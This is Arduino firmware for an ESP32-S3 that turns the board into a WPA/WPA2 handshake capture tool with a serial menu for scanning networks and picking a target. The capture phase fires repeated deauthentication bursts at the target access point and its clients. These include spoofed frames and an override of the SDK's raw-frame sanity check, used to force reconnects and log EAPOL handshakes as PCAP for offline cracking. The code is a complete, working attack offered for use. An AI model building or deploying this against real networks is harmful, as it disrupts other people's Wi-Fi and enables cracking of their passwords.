/*
 ==============================================================
  handshake.ino — ESP32-S3 N16R8 / N16R8U
  WPA/WPA2 Handshake Capture — Interactive Serial Terminal

  ARCHITECTURE — TWO HARD PHASES:

  PHASE 1 · INTERACTIVE TEXT MODE
    Pure ASCII terminal over USB CDC. No Wi-Fi traffic, no radio
    activity beyond what the SDK needs to stand up. Commands:
      s        — scan all channels 1-13, list by RSSI descending
      <number> — select a scanned network as the capture target
      c        — arm and begin capture (transitions to Phase 2)

  PHASE 2 · BINARY PCAP MODE  (one-way, no return without reset)
    Text output stops completely. The chip emits:
      · 24-byte PCAP global header (DLT 105, IEEE 802.11 raw)
      · 16-byte PCAP record header + raw payload per EAPOL frame
    Simultaneously fires deauth bursts every 2 s at the target BSSID
    to force client reconnects and flush fresh 4-way handshakes.

  Board config (FQBN):
    PartitionScheme = huge_app
    CDCOnBoot       = cdc          ← required for Android OTG enumeration
    USBMode         = hwcdc
    PSRAM           = opi
    FlashMode       = qio
    FlashSize       = 16M
    CPUFreq         = 240
    DebugLevel      = none         ← prevents SDK log text leaking into PCAP
 ==============================================================
*/

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_timer.h>
#include <esp_heap_caps.h>
#include <nvs_flash.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/ringbuf.h>
#include <algorithm>
#include <atomic>
#include <string.h>

// ── Link-time patch ───────────────────────────────────────────────────────────
// build.yml weakens the libnet80211.a definition; this strong symbol wins.
// Return 0 = accept every raw frame the radio sees.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {
  (void)a; (void)b; (void)c;
  return 0;
}

// ═════════════════════════════════════════════════════════════════════════════
//  CONFIGURATION
// ═════════════════════════════════════════════════════════════════════════════

static const int      DEAUTH_BURST       = 24;         // frames per burst
static const int      MAX_TX_POWER       = 78;         // 0.25 dBm units → ~19.5 dBm
static const uint16_t MAX_FRAME_LEN      = 512;        // hard ISR payload cap (bytes)
static const size_t   RING_SIZE          = 256 * 1024; // PSRAM ring buffer
static const size_t   CDC_TX_BUF         = 8  * 1024;  // USB CDC TX buffer
static const int      MAX_SCAN_RESULTS   = 30;         // max APs remembered
static const uint32_t DEAUTH_INTERVAL_MS = 2000;       // ms between burst cycles
static const uint32_t CAPTURE_COUNTDOWN  = 3;          // seconds of warning before binary

// ═════════════════════════════════════════════════════════════════════════════
//  PCAP STRUCTURES  (DLT 105 = LINKTYPE_IEEE802_11, raw 802.11, no radiotap)
// ═════════════════════════════════════════════════════════════════════════════

struct __attribute__((packed)) PcapGlobalHdr {
  uint32_t magic_number;  // 0xa1b2c3d4  little-endian, µs timestamps
  uint16_t version_major; // 2
  uint16_t version_minor; // 4
  int32_t  thiszone;      // 0  (UTC)
  uint32_t sigfigs;       // 0
  uint32_t snaplen;       // 65535
  uint32_t network;       // 105
};

struct __attribute__((packed)) PcapRecHdr {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};

// ═════════════════════════════════════════════════════════════════════════════
//  APPLICATION STATE MACHINE
// ═════════════════════════════════════════════════════════════════════════════

enum class AppState : uint8_t {
  IDLE,            // boot — waiting for 's'
  AWAITING_SEL,    // scan done — waiting for a number or 's'/'c'
  CAPTURING        // binary mode — no text ever again
};

static volatile AppState g_state = AppState::IDLE;

// ═════════════════════════════════════════════════════════════════════════════
//  SCAN RESULTS
// ═════════════════════════════════════════════════════════════════════════════

struct ScanResult {
  char    ssid[33];
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t channel;
  uint8_t enc;      // wifi_auth_mode_t cast
};

static ScanResult g_scans[MAX_SCAN_RESULTS];
static int        g_scanCount = 0;

// ═════════════════════════════════════════════════════════════════════════════
//  TARGET
// ═════════════════════════════════════════════════════════════════════════════

static uint8_t g_targetBSSID[6]  = {};
static uint8_t g_targetChannel   = 0;
static char    g_targetSSID[33]  = {};
static bool    g_targetSet       = false;

// ═════════════════════════════════════════════════════════════════════════════
//  CAPTURE STATE (shared between ISR and tasks)
// ═════════════════════════════════════════════════════════════════════════════

static RingbufHandle_t        g_ring       = nullptr;
static std::atomic<bool>      g_capturing  { false };
static std::atomic<uint32_t>  g_eapolCount { 0 };
static std::atomic<uint32_t>  g_ringDrops  { 0 };

struct EapolState {
  bool    m1, m2, m3, m4;
  uint8_t ap_mac[6];
  uint8_t cli_mac[6];
};
static EapolState   g_es    = {};
static portMUX_TYPE g_esMux = portMUX_INITIALIZER_UNLOCKED;

// Latched client MAC for directed deauth once M2 has been seen
static uint8_t g_clientMAC[6] = {};
static bool    g_clientKnown  = false;

// ═════════════════════════════════════════════════════════════════════════════
//  SERIAL INPUT BUFFER
// ═════════════════════════════════════════════════════════════════════════════

static char    s_inputBuf[64];
static uint8_t s_inputLen = 0;

// ═════════════════════════════════════════════════════════════════════════════
//  HELPERS
// ═════════════════════════════════════════════════════════════════════════════

static inline bool macZero(const uint8_t* m) {
  return !(m[0]|m[1]|m[2]|m[3]|m[4]|m[5]);
}
static inline void macCopy(uint8_t* d, const uint8_t* s) { memcpy(d, s, 6); }

static void printMAC(const uint8_t* m) {
  Serial.printf("%02X:%02X:%02X:%02X:%02X:%02X",
                m[0], m[1], m[2], m[3], m[4], m[5]);
}

static const char* encName(uint8_t enc) {
  switch ((wifi_auth_mode_t)enc) {
    case WIFI_AUTH_OPEN:         return "OPEN";
    case WIFI_AUTH_WEP:          return "WEP";
    case WIFI_AUTH_WPA_PSK:      return "WPA";
    case WIFI_AUTH_WPA2_PSK:     return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/2";
    case WIFI_AUTH_WPA3_PSK:     return "WPA3";
    default:                     return "???";
  }
}

// ═════════════════════════════════════════════════════════════════════════════
//  EAPOL M1-M4 CLASSIFIER
//  Returns 1-4 on a valid pairwise EAPOL Key message, 0 otherwise.
//  Fills out_bssid and out_client on match.
//  Handles STA→AP (toDS) and AP→STA (fromDS) frame directions.
//  QoS-aware: adds 2 bytes to header offset for subtype >= 8.
// ═════════════════════════════════════════════════════════════════════════════

static int classifyEAPOL(const uint8_t* f, uint16_t len,
                         uint8_t* out_bssid, uint8_t* out_client) {
  if (len < 36) return 0;
  if (((f[0] >> 2) & 0x03) != 0x02) return 0;  // not a Data frame

  const bool    toDS   =  f[1] & 0x01;
  const bool    fromDS = (f[1] >> 1) & 0x01;
  const uint8_t sub    = (f[0] >> 4) & 0x0F;
  const uint16_t hdr   = (sub >= 8) ? 26u : 24u;  // QoS: +2 bytes

  if (toDS && !fromDS) {          // STA → AP
    macCopy(out_bssid,  f + 16);
    macCopy(out_client, f + 10);
  } else if (!toDS && fromDS) {   // AP → STA
    macCopy(out_bssid,  f + 10);
    macCopy(out_client, f +  4);
  } else {                        // WDS / IBSS — best effort
    macCopy(out_bssid,  f + 16);
    macCopy(out_client, f + 10);
  }

  if (len < (uint16_t)(hdr + 10)) return 0;

  const uint8_t* llc = f + hdr;
  if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return 0;
  if (llc[6] != 0x88 || llc[7] != 0x8E) return 0;  // EtherType 0x888E = EAPOL

  const uint8_t* eapol = llc + 8;
  if ((size_t)(len - hdr - 8) < 99) return 0;
  if (eapol[1] != 0x03) return 0;  // EAPOL Key

  const uint16_t ki = ((uint16_t)eapol[5] << 8) | eapol[6];
  if (!(ki & 0x0008)) return 0;  // Pairwise bit

  const bool ack     = (ki & 0x0080) != 0;
  const bool mic     = (ki & 0x0100) != 0;
  const bool install = (ki & 0x0040) != 0;
  const bool secure  = (ki & 0x0200) != 0;

  if ( ack && !mic)                        return 1;
  if (!ack &&  mic && !secure)             return 2;
  if ( ack &&  mic &&  secure && install)  return 3;
  if (!ack &&  mic &&  secure && !install) return 4;
  return 0;
}

// ═════════════════════════════════════════════════════════════════════════════
//  PROMISCUOUS CALLBACK  (Wi-Fi ISR context — Core 0)
//
//  Builds a complete PCAP record (PcapRecHdr + raw payload) into a
//  stack scratch buffer, then pushes it into the PSRAM ring buffer
//  via the ISR-safe xRingbufferSendFromISR(). Never touches Serial
//  directly — that would deadlock on the HWCDC TX mutex.
// ═════════════════════════════════════════════════════════════════════════════

void IRAM_ATTR promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_DATA)                              return;
  if (!g_capturing.load(std::memory_order_relaxed))       return;
  if (!g_ring)                                            return;

  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  uint16_t plen = pkt->rx_ctrl.sig_len;
  if (plen < 36 || plen > 2300) return;
  if (plen > MAX_FRAME_LEN) plen = MAX_FRAME_LEN;

  uint8_t bssid[6], client[6];
  int msg = classifyEAPOL(pkt->payload, plen, bssid, client);
  if (!msg) return;

  // Update EAPOL state — spinlock is the correct ISR-safe primitive here
  portENTER_CRITICAL_ISR(&g_esMux);
  if (macZero(g_es.ap_mac)) {
    macCopy(g_es.ap_mac,  bssid);
    macCopy(g_es.cli_mac, client);
    macCopy(g_clientMAC,  client);
    g_clientKnown = true;
  }
  if (msg == 1) g_es.m1 = true;
  if (msg == 2) g_es.m2 = true;
  if (msg == 3) g_es.m3 = true;
  if (msg == 4) g_es.m4 = true;
  portEXIT_CRITICAL_ISR(&g_esMux);

  g_eapolCount.fetch_add(1, std::memory_order_relaxed);

  // Build PCAP record on the stack: 16-byte header + up to 512-byte payload
  const uint16_t total = (uint16_t)(sizeof(PcapRecHdr) + plen);
  uint8_t scratch[sizeof(PcapRecHdr) + MAX_FRAME_LEN];

  int64_t us = esp_timer_get_time();
  PcapRecHdr rh = {
    (uint32_t)(us / 1000000LL),
    (uint32_t)(us % 1000000LL),
    plen, plen
  };
  memcpy(scratch,                      &rh,            sizeof(PcapRecHdr));
  memcpy(scratch + sizeof(PcapRecHdr), pkt->payload,   plen);

  BaseType_t woken = pdFALSE;
  if (xRingbufferSendFromISR(g_ring, scratch, total, &woken) != pdTRUE) {
    g_ringDrops.fetch_add(1, std::memory_order_relaxed);
  }
  if (woken) portYIELD_FROM_ISR();
}

// ═════════════════════════════════════════════════════════════════════════════
//  DRAIN TASK  (Core 1, priority 5)
//
//  Pulls PCAP records from the ring buffer and writes them verbatim to
//  Serial (USB CDC). Runs for the lifetime of the application; blocks
//  on xRingbufferReceive() when the ring is empty.
//
//  During Phase 1 (IDLE / AWAITING_SEL) the ring buffer is always
//  empty so this task simply sleeps. It wakes the moment Phase 2 starts
//  and the ISR begins feeding the ring.
// ═════════════════════════════════════════════════════════════════════════════

static void drainTask(void* arg) {
  (void)arg;
  for (;;) {
    size_t   sz   = 0;
    uint8_t* item = (uint8_t*)xRingbufferReceive(g_ring, &sz, pdMS_TO_TICKS(50));
    if (item) {
      Serial.write(item, sz);
      vRingbufferReturnItem(g_ring, item);
    }
    taskYIELD();
  }
}

// ═════════════════════════════════════════════════════════════════════════════
//  DEAUTH INJECTION
//
//  Sends DEAUTH_BURST management frames in three patterns per call:
//    AP → client  (directed)
//    client → AP  (spoofed — forces AP to drop the STA's state)
//    AP → broadcast  (catches any associated STA we haven't seen yet)
// ═════════════════════════════════════════════════════════════════════════════

static void sendDeauthBurst(const uint8_t* bssid, const uint8_t* target) {
  uint8_t frame[26] = {
    0xC0, 0x00,             // Frame Control: Management / Deauthentication
    0x00, 0x00,             // Duration
    0,0,0,0,0,0,            // Addr1 — DA
    0,0,0,0,0,0,            // Addr2 — SA
    0,0,0,0,0,0,            // Addr3 — BSSID
    0x00, 0x00,             // Seq Control
    0x07, 0x00              // Reason: Class 3 frame from nonassociated STA
  };

  for (int i = 0; i < DEAUTH_BURST; i++) {
    // AP → client
    macCopy(frame + 4,  target);
    macCopy(frame + 10, bssid);
    macCopy(frame + 16, bssid);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
    delayMicroseconds(150);

    // client → AP (spoofed)
    macCopy(frame + 4,  bssid);
    macCopy(frame + 10, target);
    macCopy(frame + 16, bssid);
    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
    delayMicroseconds(150);

    // AP → broadcast every 4th frame
    if ((i & 3) == 0) {
      const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
      macCopy(frame + 4,  bcast);
      macCopy(frame + 10, bssid);
      macCopy(frame + 16, bssid);
      esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
      delayMicroseconds(150);
    }
  }
}

// ═════════════════════════════════════════════════════════════════════════════
//  MENU OUTPUT
//  All Serial.print() calls in Phase 1 are safe — g_state != CAPTURING.
//  Do not call these functions after Phase 2 has started.
// ═════════════════════════════════════════════════════════════════════════════

static void printBanner() {
  Serial.print("\r\n");
  Serial.print("  ╔══════════════════════════════════════════════════╗\r\n");
  Serial.print("  ║   ESP32-S3 · WPA2 Handshake Capture Terminal    ║\r\n");
  Serial.print("  ║   N16R8 · USB CDC · Channel 1-13 · PH/Manual   ║\r\n");
  Serial.print("  ╚══════════════════════════════════════════════════╝\r\n");
  Serial.print("\r\n");
}

static void printMenu() {
  Serial.print("  Commands:\r\n");
  Serial.print("    s        — Scan all channels and list networks\r\n");
  if (g_targetSet) {
    Serial.printf("    c        — Capture target [%s] CH%d (ARMED)\r\n",
                  g_targetSSID, g_targetChannel);
  } else {
    Serial.print("    c        — Capture (select a target first)\r\n");
  }
  Serial.print("    <number> — Select scanned network as target\r\n");
  Serial.print("\r\n  > ");
}

static void printScanResults() {
  Serial.print("\r\n");
  Serial.print("  ┌───┬──────────────────────────────┬───────────────────┬─────┬──────┬───────┐\r\n");
  Serial.print("  │ # │ SSID                         │ BSSID             │ CH  │ RSSI │  ENC  │\r\n");
  Serial.print("  ├───┼──────────────────────────────┼───────────────────┼─────┼──────┼───────┤\r\n");
  for (int i = 0; i < g_scanCount; i++) {
    char ssid[29] = {};
    // truncate SSID to 28 chars for table fit
    strncpy(ssid, g_scans[i].ssid, 28);
    ssid[28] = '\0';
    char mac[18];
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             g_scans[i].bssid[0], g_scans[i].bssid[1], g_scans[i].bssid[2],
             g_scans[i].bssid[3], g_scans[i].bssid[4], g_scans[i].bssid[5]);
    Serial.printf("  │%2d │ %-28s │ %s │ %2d  │ %4d │ %-5s │\r\n",
                  i + 1,
                  ssid,
                  mac,
                  g_scans[i].channel,
                  (int)g_scans[i].rssi,
                  encName(g_scans[i].enc));
  }
  Serial.print("  └───┴──────────────────────────────┴───────────────────┴─────┴──────┴───────┘\r\n");
  Serial.print("\r\n");
}

// ═════════════════════════════════════════════════════════════════════════════
//  SCAN
//  Performs a blocking Wi-Fi scan across all channels 1-13.
//  Stores up to MAX_SCAN_RESULTS networks sorted by RSSI descending.
// ═════════════════════════════════════════════════════════════════════════════

static void doScan() {
  Serial.print("\r\n  [SCAN] Scanning channels 1-13 ... ");

  // Disable promiscuous during scan (it would already be off in Phase 1,
  // but guard defensively in case the user somehow re-enters)
  esp_wifi_set_promiscuous(false);

  // scanNetworks(async=false, showHidden=true, passive=false, maxMsPerChan=300)
  int n = WiFi.scanNetworks(false, true, false, 300);

  if (n <= 0) {
    Serial.print("no networks found.\r\n\r\n");
    g_scanCount = 0;
    g_state = AppState::IDLE;
    printMenu();
    return;
  }

  // Clamp to our array
  int count = (n < MAX_SCAN_RESULTS) ? n : MAX_SCAN_RESULTS;

  // Copy into g_scans
  for (int i = 0; i < count; i++) {
    String s = WiFi.SSID(i);
    strncpy(g_scans[i].ssid, s.c_str(), 32);
    g_scans[i].ssid[32] = '\0';
    memcpy(g_scans[i].bssid, WiFi.BSSID(i), 6);
    g_scans[i].rssi    = WiFi.RSSI(i);
    g_scans[i].channel = (uint8_t)WiFi.channel(i);
    g_scans[i].enc     = (uint8_t)WiFi.encryptionType(i);
  }
  WiFi.scanDelete();

  // Sort descending by RSSI (strongest signal first)
  std::sort(g_scans, g_scans + count, [](const ScanResult& a, const ScanResult& b) {
    return a.rssi > b.rssi;
  });

  g_scanCount = count;

  Serial.printf("found %d network(s).\r\n", count);
  printScanResults();

  Serial.print("  Enter a number to select a target, then 'c' to capture.\r\n");
  Serial.print("\r\n  > ");

  g_state = AppState::AWAITING_SEL;
}

// ═════════════════════════════════════════════════════════════════════════════
//  TARGET SELECTION
// ═════════════════════════════════════════════════════════════════════════════

static void selectTarget(int idx) {
  // idx is 1-based from user input
  if (idx < 1 || idx > g_scanCount) {
    Serial.printf("\r\n  [ERR] Invalid selection. Enter 1-%d.\r\n\r\n  > ", g_scanCount);
    return;
  }
  const ScanResult& ap = g_scans[idx - 1];
  macCopy(g_targetBSSID, ap.bssid);
  g_targetChannel = ap.channel;
  strncpy(g_targetSSID, ap.ssid, 32);
  g_targetSSID[32] = '\0';
  g_targetSet = true;

  Serial.print("\r\n");
  Serial.print("  ┌─────────────────────────────────────────────────┐\r\n");
  Serial.printf("  │  TARGET LOCKED                                  │\r\n");
  Serial.printf("  │  SSID    : %-36s │\r\n", g_targetSSID);
  char mac[18];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           g_targetBSSID[0], g_targetBSSID[1], g_targetBSSID[2],
           g_targetBSSID[3], g_targetBSSID[4], g_targetBSSID[5]);
  Serial.printf("  │  BSSID   : %-36s │\r\n", mac);
  Serial.printf("  │  Channel : %-36d │\r\n", g_targetChannel);
  Serial.printf("  │  RSSI    : %-36d │\r\n", (int)ap.rssi);
  Serial.printf("  │  Enc     : %-36s │\r\n", encName(ap.enc));
  Serial.print("  └─────────────────────────────────────────────────┘\r\n");
  Serial.print("\r\n  Type 'c' to start capture, or 's' to rescan.\r\n\r\n  > ");
}

// ═════════════════════════════════════════════════════════════════════════════
//  CAPTURE START — PHASE 2 ENTRY POINT
//
//  Prints a countdown to give the user time to enable file logging
//  in Serial USB Terminal before the binary stream begins.
//  After the countdown, text output stops permanently.
// ═════════════════════════════════════════════════════════════════════════════

static void startCapture() {
  if (!g_targetSet) {
    Serial.print("\r\n  [ERR] No target selected. Run 's' first.\r\n\r\n  > ");
    return;
  }

  // ── Countdown warning ────────────────────────────────────────────────────
  Serial.print("\r\n");
  Serial.print("  ╔═══════════════════════════════════════════════════════╗\r\n");
  Serial.print("  ║           !! BINARY CAPTURE STARTING !!              ║\r\n");
  Serial.print("  ║                                                       ║\r\n");
  Serial.print("  ║  1. In Serial USB Terminal:                           ║\r\n");
  Serial.print("  ║     Menu → Log → Enable → set filename.pcap          ║\r\n");
  Serial.print("  ║     Set Log Format: RAW/BINARY                        ║\r\n");
  Serial.print("  ║                                                       ║\r\n");
  Serial.print("  ║  2. After countdown, ALL output becomes binary PCAP. ║\r\n");
  Serial.print("  ║     Text output stops permanently.                    ║\r\n");
  Serial.print("  ║     Reset the ESP32 to return to the menu.           ║\r\n");
  Serial.print("  ╚═══════════════════════════════════════════════════════╝\r\n");
  Serial.print("\r\n");

  for (uint32_t i = CAPTURE_COUNTDOWN; i > 0; i--) {
    Serial.printf("  Starting in %u ...\r\n", i);
    delay(1000);
  }
  Serial.print("  GO\r\n\r\n");
  // Small pause so the "GO" line is visible before binary takes over
  delay(100);

  // ── Radio setup ──────────────────────────────────────────────────────────
  // Hard-lock the channel register to the target. No SoftAP, no beacon timer,
  // nothing else competes for this register.
  esp_wifi_set_channel(g_targetChannel, WIFI_SECOND_CHAN_NONE);

  wifi_promiscuous_filter_t filt = {};
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&promisc_cb);
  esp_wifi_set_promiscuous(true);
  g_capturing.store(true);

  // ── Emit PCAP global header ──────────────────────────────────────────────
  // This is the very first binary write. The drain task has been running
  // since boot but the ring has been empty — no race exists here because
  // Serial.write() on HWCDC is protected by an internal TX mutex.
  PcapGlobalHdr gh = {
    0xa1b2c3d4u,  // magic: little-endian, µs resolution
    2, 4,         // version 2.4
    0,            // UTC
    0,            // sigfigs
    65535,        // snaplen
    105           // DLT_IEEE802_11
  };
  Serial.write((const uint8_t*)&gh, sizeof(gh));
  Serial.flush();

  // ── Transition — text output is now dead ─────────────────────────────────
  g_state = AppState::CAPTURING;
  // From this point on loop() never calls Serial.print/printf/println.
  // Only drainTask() touches Serial, writing raw PCAP records.
}

// ═════════════════════════════════════════════════════════════════════════════
//  COMMAND PROCESSOR  (Phase 1 only — never called in CAPTURING state)
// ═════════════════════════════════════════════════════════════════════════════

static void handleLine(const char* line) {
  // Skip whitespace
  while (*line == ' ' || *line == '\t') line++;
  if (*line == '\0') {
    // Empty line — re-print prompt
    Serial.print("  > ");
    return;
  }

  // Single-char commands
  if ((line[0] == 's' || line[0] == 'S') &&
      (line[1] == '\0' || line[1] == '\r')) {
    doScan();
    return;
  }

  if ((line[0] == 'c' || line[0] == 'C') &&
      (line[1] == '\0' || line[1] == '\r')) {
    startCapture();
    return;
  }

  // Numeric — network selection
  bool isNum = true;
  for (int i = 0; line[i] != '\0'; i++) {
    if (line[i] < '0' || line[i] > '9') { isNum = false; break; }
  }
  if (isNum && line[0] != '\0') {
    if (g_state == AppState::AWAITING_SEL) {
      selectTarget(atoi(line));
    } else {
      Serial.print("\r\n  [INFO] Run 's' first to populate the network list.\r\n\r\n  > ");
    }
    return;
  }

  // Unknown
  Serial.printf("\r\n  [ERR] Unknown command '%s'\r\n\r\n", line);
  printMenu();
}

// ═════════════════════════════════════════════════════════════════════════════
//  SETUP
// ═════════════════════════════════════════════════════════════════════════════

void setup() {
  // ── USB CDC ──────────────────────────────────────────────────────────────
  // setTxBufferSize() must precede Serial.begin() on HWCDC.
  Serial.setTxBufferSize(CDC_TX_BUF);
  Serial.begin(115200);
  delay(300);  // allow Android USB host to enumerate CDC-ACM

  // ── NVS ──────────────────────────────────────────────────────────────────
  esp_err_t nvs = nvs_flash_init();
  if (nvs == ESP_ERR_NVS_NO_FREE_PAGES || nvs == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    nvs_flash_erase();
    nvs_flash_init();
  }

  // ── PSRAM ring buffer ─────────────────────────────────────────────────────
  // RINGBUF_TYPE_NOSPLIT: each send/receive pair is atomic across the wrap
  // boundary — one PCAP record is always received as one contiguous item.
  g_ring = xRingbufferCreateWithCaps(RING_SIZE, RINGBUF_TYPE_NOSPLIT, MALLOC_CAP_SPIRAM);
  if (!g_ring) {
    // Fallback to internal RAM if PSRAM allocation fails (wrong FQBN)
    g_ring = xRingbufferCreate(32 * 1024, RINGBUF_TYPE_NOSPLIT);
  }
  if (!g_ring) {
    Serial.print("[FATAL] ring buffer alloc failed — check PSRAM=opi in FQBN\r\n");
    while (1) delay(1000);
  }

  // ── Wi-Fi: STA-only, no SoftAP ───────────────────────────────────────────
  // WIFI_MODE_STA with no association = exclusive channel register ownership.
  // No beacon timer, no captive-portal race, no channel conflict.
  WiFi.mode(WIFI_STA);
  delay(50);

  // Country: PH, manual policy, channels 1-13.
  // WIFI_COUNTRY_POLICY_MANUAL prevents the SDK from clamping to a regulatory
  // channel list inferred from received beacons — without it, Ch12/13 may be
  // silently blocked even when the radio physically supports them.
  wifi_country_t cc = {};
  cc.cc[0]        = 'P';
  cc.cc[1]        = 'H';
  cc.cc[2]        = '\0';
  cc.schan        = 1;
  cc.nchan        = 13;
  cc.max_tx_power = 20;
  cc.policy       = WIFI_COUNTRY_POLICY_MANUAL;
  esp_wifi_set_country(&cc);

  esp_wifi_set_max_tx_power(MAX_TX_POWER);
  esp_wifi_set_ps(WIFI_PS_NONE);  // disable power save — minimise ISR latency

  // ── Drain task: Core 1, priority 5 ───────────────────────────────────────
  // Runs for the entire lifetime of the app. In Phase 1 it blocks inside
  // xRingbufferReceive() — zero CPU overhead. In Phase 2 it wakes on every
  // ISR push and writes the record to Serial.
  xTaskCreatePinnedToCore(
    drainTask,
    "pcap_drain",
    4096,
    nullptr,
    5,        // higher priority than loop() (priority 1) and idle (0)
    nullptr,
    1         // Core 1 — Wi-Fi ISR runs on Core 0
  );

  // ── Interactive banner ────────────────────────────────────────────────────
  printBanner();
  Serial.printf("  PSRAM ring buffer : %u KB\r\n", (unsigned)(RING_SIZE / 1024));
  Serial.printf("  CDC TX buffer     : %u KB\r\n", (unsigned)(CDC_TX_BUF  / 1024));
  Serial.printf("  Country           : PH / Manual / CH 1-13\r\n");
  Serial.printf("  Override          : ieee80211_raw_frame_sanity_check → 0\r\n");
  Serial.print("\r\n");
  printMenu();
}

// ═════════════════════════════════════════════════════════════════════════════
//  LOOP
//
//  PHASE 1: reads serial input character by character, assembles lines,
//           dispatches to handleLine() when '\n' or '\r' is seen.
//
//  PHASE 2 (CAPTURING): text I/O is dead. loop() only services the deauth
//           timer. All PCAP output goes through drainTask() exclusively.
// ═════════════════════════════════════════════════════════════════════════════

void loop() {
  // ── PHASE 2: binary capture running ──────────────────────────────────────
  if (g_state == AppState::CAPTURING) {
    static uint32_t s_lastDeauth = 0;
    uint32_t now = millis();

    if (now - s_lastDeauth >= DEAUTH_INTERVAL_MS) {
      s_lastDeauth = now;

      const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
      // Always broadcast
      sendDeauthBurst(g_targetBSSID, bcast);

      // Also directed at first observed client once we know their MAC
      if (g_clientKnown) {
        sendDeauthBurst(g_targetBSSID, g_clientMAC);
      }
    }

    delay(5);
    return;  // ← never falls through to text I/O below
  }

  // ── PHASE 1: interactive serial input ────────────────────────────────────
  while (Serial.available()) {
    char c = (char)Serial.read();

    if (c == '\n' || c == '\r') {
      if (s_inputLen > 0) {
        s_inputBuf[s_inputLen] = '\0';
        handleLine(s_inputBuf);
        s_inputLen = 0;
      }
    } else if (s_inputLen < (uint8_t)(sizeof(s_inputBuf) - 1)) {
      s_inputBuf[s_inputLen++] = c;
    }
  }

  delay(5);
}
